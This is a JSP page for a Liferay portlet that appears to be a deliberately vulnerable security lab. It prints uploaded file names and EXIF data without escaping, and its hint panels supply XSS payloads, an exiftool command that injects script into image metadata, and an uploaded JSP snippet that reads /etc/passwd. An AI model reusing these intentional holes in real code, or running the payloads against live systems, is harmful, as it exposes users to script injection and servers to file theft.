<%@ page import="com.liferay.portal.kernel.util.ParamUtil" %>
<%@ page import="com.liferay.portal.kernel.util.HtmlUtil" %>
<%@ page import="com.liferay.portal.kernel.theme.ThemeDisplay" %>
<%@ page import="com.liferay.portal.kernel.util.WebKeys" %>

<%@ include file="/init.jsp" %>

<portlet:actionURL name="uploadFileAction" var="uploadFileActionURL"></portlet:actionURL>

<aui:form action="<%= uploadFileActionURL %>" method="post" name="<portlet:namespace />fm" enctype="multipart/form-data">
	<aui:input type="file" name="sampleFile" />
	<aui:input type="submit" name="upload" value="upload" />
</aui:form>

<%

String userId = String.valueOf(themeDisplay.getUserId());

String originalFileName = portletPreferences.getValue(userId + "originalFileName", "No original file name");
String viewFileName = portletPreferences.getValue(userId + "viewFileName", "");
String info = portletPreferences.getValue(userId + "info", "");
%>

<p>Original file name:<%= originalFileName %></p>

<p>ImageMagick's data:
<pre>
<%= info %>
</pre>
</p>

<p>Image:<img src="/html/images/<%= viewFileName %>"></p>

<p>Your task is to display an alert box for the <b>Original file name</b> field. If you stuck, open the panels.

<liferay-ui:panel-container>
	<liferay-ui:panel collapsible="true" state="closed" title="file name 1">
		<p>Make a file with a malicious payload in it's name. I may try first 
		<%= HtmlUtil.escape("<script>alert(1)</script>") %>.gif.</p>
	</liferay-ui:panel>
	<liferay-ui:panel collapsible="true" state="closed" title="empty file">
		<p>You should not try with an empty file. The mininal gif should contain the text <b>GIF98a</b></p>
	</liferay-ui:panel>
	
	<liferay-ui:panel collapsible="true" state="closed" title="file name 2">
		<p>On Linux, this is hard because of the directory separator (/).
		<a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20injection">
			Find other ways
		</a>
		</p>
	</liferay-ui:panel>
	<liferay-ui:panel collapsible="true" state="closed" title="file name 3">
		<p>Maybe <%= HtmlUtil.escape("<video src=_ onloadstart='alert(1)'>") %>.gif.</p>
	</liferay-ui:panel>
	<liferay-ui:panel collapsible="true" state="closed" title="file name 4">
		<p>Maybe <%= HtmlUtil.escape("<video src=_ onloadstart=alert(1)>") %>.gif.</p>
	</liferay-ui:panel>
</liferay-ui:panel-container>

<p>Your task is to display an alert box for the <b>Imagemagick's data</b> field. It shows the exif data.

<liferay-ui:panel-container>
	<liferay-ui:panel collapsible="true" state="closed" title="hint 1">
		<p>Make a file with a malicious payload in it's exif data. I may try first 
		<%= HtmlUtil.escape("<script>alert(1)</script>") %> in a jpg file's exif data.</p>
	</liferay-ui:panel>
	<liferay-ui:panel collapsible="true" state="closed" title="hint 2">
		<p>On Linux, there is the <b>exiftool</b> command.</p>
	</liferay-ui:panel>
	
	<liferay-ui:panel collapsible="true" state="closed" title="hint 3">
		<p>OK, there is a bunch of possibilities, but <b>ImageDescription</b> should work.
		</p>
	</liferay-ui:panel>
	<liferay-ui:panel collapsible="true" state="closed" title="hint 4">
		<p><%= HtmlUtil.escape("exiftool -ImageDescription='<script>alert(3)</script>' dog1-exif.jpg") %> </p>
		<p>Maybe <%= HtmlUtil.escape("<video src=_ onloadstart='alert(1)'>") %>.gif.</p>
	</liferay-ui:panel>
</liferay-ui:panel-container>

<p>Now display the /etc/passwd file!</p>

<liferay-ui:panel-container>
	<liferay-ui:panel collapsible="true" state="closed" title="hint 1">
		<p>Upload a jsp file</p> 
	</liferay-ui:panel>
	<liferay-ui:panel collapsible="true" state="closed" title="hint 2">
<pre>
<c:out value="<pre>"  escapeXml="true" />
<<c:out value="%= FileUtil.read(\"/etc/passwd\") %"  escapeXml="true" />>
<c:out value="</pre>" escapeXml="true" />
</pre>

	</liferay-ui:panel>
	
	<liferay-ui:panel collapsible="true" state="closed" title="hint 3">

<pre>
<<c:out value="%@ page import=\"com.liferay.portal.kernel.util.FileUtil\" %" />>
<c:out value="<pre>"  escapeXml="true" />
<<c:out value="%= FileUtil.read(\"/etc/passwd\") %"  escapeXml="true" />>
<c:out value="</pre>" escapeXml="true" />
</pre>
	</liferay-ui:panel>
	<liferay-ui:panel collapsible="true" state="closed" title="hint 4">
		<p> OK, you was successful unploading the jsp file. But how can you view the /etc/passwd file?</p>
	</liferay-ui:panel>
	<liferay-ui:panel collapsible="true" state="closed" title="hint 5">
		<p> Click on the image with the right mouse button and</p>
	</liferay-ui:panel>
</liferay-ui:panel-container>
